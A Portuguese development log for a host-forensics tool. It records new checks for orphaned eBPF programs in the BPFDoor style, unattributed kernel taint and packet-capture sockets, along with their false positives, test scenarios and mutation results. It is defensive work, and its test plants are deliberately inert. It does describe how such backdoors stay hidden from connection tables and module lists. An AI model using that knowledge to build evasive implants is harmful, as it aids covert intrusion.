/proc/sys/kernel/tainted   12288  = bits 12 (O) e 13 (E)
/proc/modules              nvidia, nvidia_drm, nvidia_modeset, nvidia_uvm (OE)
achado                     NENHUM — as duas letras têm dono
```

Acusar o estado acusaria esse host, e não há nada de errado com ele. O achado é
o kernel dizer "um módulo não assinado foi carregado" e nenhum módulo carregado
assumir: ou ele saiu depois — que é o que se faz para não deixar rastro — ou
ainda está lá e não aparece na lista, que é a definição de rootkit.

### O falso positivo que a suíte inteira pegou, e que eu não tinha previsto

O cenário 19 roda um contêiner com `SYS_ADMIN`, e foi o único da matriz onde a
`bpf(2)` responde de dentro de um contêiner. O resultado:

```
⛔ bpf prog id=48   programa eBPF carregado no kernel sem nenhum dono visível
   parcial          46 programa(s) eBPF sem dono visível não foram atribuídos
```

Um crítico contra um programa legítimo da máquina que rodava a suíte. A causa é
estrutural e vale mais que o achado: **o espaço de ids do eBPF é global**. De
dentro de um contêiner enumeram-se os programas do HOST — e os processos que os
seguram estão fora daquele namespace de PID. A metade da pergunta que atribui
está cega, então nenhuma resposta dela vale.

A regra que entrou: em contêiner o check não acusa e declara. O cenário 19
passou a travar isso — `Forbid: kernel.bpf_unowned` e cobertura incompleta, com
o motivo dito. É a mesma decisão que o coletor de ftrace já tinha tomado por
outro caminho, e agora as duas estão escritas lado a lado.

### O par de cenários que prova o check, e não só o dispara

`P1` e `P2` carregam o MESMO programa, com a mesma syscall, no mesmo kernel. A
única diferença é quem fica segurando o descritor depois:

```
P1  fecha o descritor, o socket segura     ⛔ crítico     (a forma do BPFDoor)
P2  mantém o descritor aberto              silêncio      (a forma do libbpf)
P3  pin no bpffs, carregador saiu          silêncio      (a forma do cilium)
P4  perf_event legado, sem link            silêncio      (a forma do bpftrace)
P6  BPF_PROG_ATTACH num cgroup, e sai      lacuna dita   (a forma do systemd)
P7  vivo só por estar num prog_array       silêncio      (o datapath do cilium)
P5  taint sem módulo que o admita          ⚠ aviso
```

Sem P2, P3, P4, P6 e P7 o check estaria só disparando. **Cinco dos sete
cenários existem para provar SILÊNCIO**, e cada um é uma população legítima que
existe em servidor de verdade — se qualquer uma delas virasse achado, o check
falaria em todo host com observabilidade, com contêiner ou com systemd, e
ninguém leria a saída.

O plantio é eBPF de verdade em todos: `BPF_PROG_LOAD` à mão, mais
`BPF_PROG_ATTACH` num cgroup v2 montado pelo guest e `BPF_MAP_CREATE` de um
prog_array com o programa dentro. Duas instruções — devolve um valor e termina.
A FORMA é o que está sob teste; comportamento de implante não entra na suíte.

E o P7 vale por um detalhe: ele é a única coisa que exercita a leitura de mapa
contra um kernel de verdade. Foi ali que o defeito de layout teria aparecido em
execução, se o teste não o tivesse pego antes.

### O kernel de 2014 respondeu diferente do que eu tinha escrito

A regra "sem MECANISMO não é lacuna" foi medida contra os dois kernels legados
que a suíte já baixa, e ela vale — mas a FRASE estava errada:

```
kernel 3.18   ENOSYS  →  cobertura completa, e o motivo dito
kernel 4.14   ENOSYS  →  idem
```

Os dois são `linux-vanilla` do Alpine, compilados sem `CONFIG_BPF_SYSCALL`. A
primeira versão da mensagem afirmava "anterior ao 3.18" — e saiu num guest 3.18
e num 4.14. O errno prova que a syscall não existe AQUI; a versão é outra
pergunta, e afirmar o que não se mediu é o defeito que esta base persegue nos
outros lugares. O texto agora diz as duas causas possíveis, e o cenário 50
trava isso contra um kernel de 2014 de verdade.

### O que ficou declarado e NÃO foi feito

```
netlink            tc e xdp: quem segura é a interface. É a mesma dependência
                   que a §35.5 já esperava, e fecharia a maior das lacunas novas
BPF_PROG_QUERY     anexo por cgroup sem link, que é o systemd antigo
nome por BTF       um programa fentry sabe qual função intercepta, e o nome está
                   no BTF do kernel. Hoje isso vem do ftrace, pelo outro lado
conteúdo de mapa   só o prog_array é lido, e só para resolver tail call. O mapa
                   de um implante guarda config e alvo, e ninguém olha
/proc/net/packet   o socket que segura um socket_filter órfão é de ALGUÉM, e
                   AF_PACKET tem inode — dá para nomear o processo. É barato, e
                   é a continuação natural do P1
módulo VISÍVEL     módulo carregado que assume a própria marca não vira achado,
                   por desenho. Um LKM malicioso que não se esconde passa — o
                   que falta ali é inventário de módulo, não outro juízo
```

### As decisões novas, medidas por mutação

O `make mutacao` amostra o pacote inteiro, e o que interessava aqui era saber se
a suíte tem dentes NO QUE ACABOU DE SER ESCRITO. Oito mutações dirigidas às
decisões desta fase, todas mortas:

```
órfão que intercepta deixa de ser crítico          morta
conjunção da fixação vira disjunção                morta
guarda de contêiner removida                       morta
atribuição do taint invertida                      morta
marca não atribuível a módulo passa a ser órfã     morta
módulo forçado deixa de ser crítico                morta
programa COM dono passa a ser avaliado             morta
tipo desconhecido vira fixação visível             morta
```

A terceira é a que mais importa: ela é o falso positivo do cenário 19, e ganhou
teste unitário além do cenário. A auditoria de cobertura de teste já tinha
achado que **nenhum dos falsos positivos corrigidos tinha teste**; este tem.

### Estado

76 checks, 117 cenários, 178 execuções. `make verify`, `make race` e a suíte de
cenários limpos. Sete das oito lacunas do `ATTACK.md` continuam fechadas, e o
mapa ganhou uma linha nova: `T1205.002`, filtro de socket — a forma do BPFDoor,
que não abre porta e por isso nunca apareceu na tabela de conexões.

---

## Registro — o outro lado do BPFDoor: quem segura o filtro

Continuação direta da fase 8, e ela existe porque o achado terminava numa
instrução vaga. O `kernel.bpf_unowned` dizia "procure quem o segura: um
processo com socket aberto que não explique o que faz" — e essa frase é o tipo
de coisa que um relatório escreve quando não sabe.

### O ponto cego era mais largo que o eBPF

A ferramenta lê `/proc/net/tcp` e `/proc/net/udp`. Um socket AF_PACKET não
aparece em nenhum dos dois, não abre porta e não tem par remoto: **para a
tabela de conexões inteira, quem tem um deles não tem rede.** É o mecanismo do
sniffer, e era invisível ao catálogo todo — não só ao check novo.

Com `/proc/net/packet` e `/proc/net/raw{,6}` lidos, o achado de eBPF órfão
passou de instrução vaga para lista de nomes:

```
· candidatos a detentor, entre os processos que têm socket de captura:
  helper (pid=70) — é candidato, não prova: o kernel não diz qual socket
  carrega qual programa
```

A ressalva é obrigatória e não é modéstia: **o kernel não expõe a ligação**
entre socket e programa. Afirmar mais que candidato seria inventar o elo que
falta, que é o defeito que esta base persegue em todos os outros lugares.

### A população legítima, medida dos dois lados

```
desktop com wifi   3 sockets AF_PACKET, todos de root: ARP, EAPOL e TDLS
                   + 1 raw6 de ICMPv6 — é o wpa_supplicant e o DHCP
contêiner debian   1 socket AF_PACKET, protocolo 0000, sem interface,
                   coluna R em ZERO
```

O segundo derrubou **quarenta cenários de uma vez** na primeira execução da
suíte. Todo contêiner tem esse socket: o runtime o cria ao montar o namespace
de rede, e o dono dele vive fora do contêiner — então ele saía como "alguém
pode ler o tráfego, dono não identificado" em toda varredura de contêiner, e
ainda degradava a cobertura.

A correção não é uma exceção por nome: é a coluna `R` do próprio kernel. Sem
estar enganchado no caminho de recepção, **o socket não recebe quadro nenhum**.
A §2.6 pergunta por quem LÊ, e ele não lê. Um socket inerte não entra no
inventário, não conta na cobertura e não é oferecido como candidato.

### E os kernels legados pegaram o segundo

Os guests de 3.18 e 4.14 não têm `/proc/net/packet` — são compilados sem
`CONFIG_PACKET`. O coletor tratava ausência como ilegível e degradava a
cobertura dos três cenários de kernel antigo.

O comentário que eu tinha escrito ali dizia exatamente a regra certa
("AUSENTE não é ILEGÍVEL") e o código fazia o contrário. É a mesma distinção do
coletor de ftrace, e agora ela está implementada e não só descrita:

```
não existe        kernel sem CONFIG_PACKET: não há socket para achar
existe e não abre lacuna de verdade, declarada
```

### Por que é inventário, e não acusação

Cliente de DHCP, wpa_supplicant e NetworkManager usam o mesmo mecanismo do
sniffer. O que separa é o NOME de quem segura, e reconhecer nome é trabalho de
quem opera o host — a ferramenta entrega o quadro. Nem ETH_P_ALL escapa disso:
o dhclient da ISC pede TODO o tráfego e filtra por cima, e o `tcpdump` do
próprio respondedor produz a mesma linha.

O juízo objetivo mora na correlação, não no socket: é o eBPF órfão que
transforma a lista de candidatos em pergunta.

### Estado

77 checks, 119 cenários, 181 execuções. `make verify`, `make race` e a suíte
inteira limpos. O `P8` monta a forma completa do BPFDoor numa VM — socket
AF_PACKET com filtro eBPF e descritor fechado, sem porta aberta nenhuma — e o
`P9` prova a metade negativa em debian e alpine: o mesmo socket, sem programa,
não vira acusação.

### E a varredura como root, que era o passo que faltava

A atribuição funcionou contra a população real:

```
◆ net.packet_socket  pid=898  NetworkManager   packet:ARP em wlp61s0 · raw6:ICMPv6
◆ net.packet_socket  pid=978  wpa_supplicant   packet:TDLS · packet:EAPOL (802.1X)
```

Cobertura 5/5, zero parciais — os mesmos quatro sockets que saíam como "dono
não identificado" sem privilégio agora têm nome, e o nome é exatamente o que a
seção prevê: gerenciador de rede.

E ela expôs um defeito que nenhuma varredura sem root podia mostrar, porque sem
root o dono do socket é invisível e o check nem chega a disparar: o
`net.listener_unowned` saiu **duas vezes com texto idêntico** — mesmo pid,
mesmo endereço, mesma porta.

```
5315: 00000000:14E9 …  uid 1000  inode 9955174
5315: 00000000:14E9 …  uid 1000  inode 9955173     ← o mesmo processo
5315: 00000000:14E9 …  uid  969  inode 14596       ← avahi, com dono de pacote
```

O mdns do `adb` mantém DOIS sockets na mesma porta (SO_REUSEPORT), e o check
emitia um achado por socket. Duas linhas iguais não são dois fatos — e no JSONL
que a frota agrega elas contavam duas escutas onde há uma.

O agrupamento agora é por ESCUTA (pid + endereço + protocolo), e a contagem não
some: ela vira evidência, porque vários descritores dividindo uma porta diz algo
sobre a forma do serviço. Dois testes travam as duas direções — a mesma porta
não duplica, e portas diferentes do mesmo processo não se fundem —, e o segundo
existe porque a correção óbvia (agrupar por pid) esconderia a segunda escuta.

O `net.egress_unowned` já agrupava por pid e não tinha o defeito.
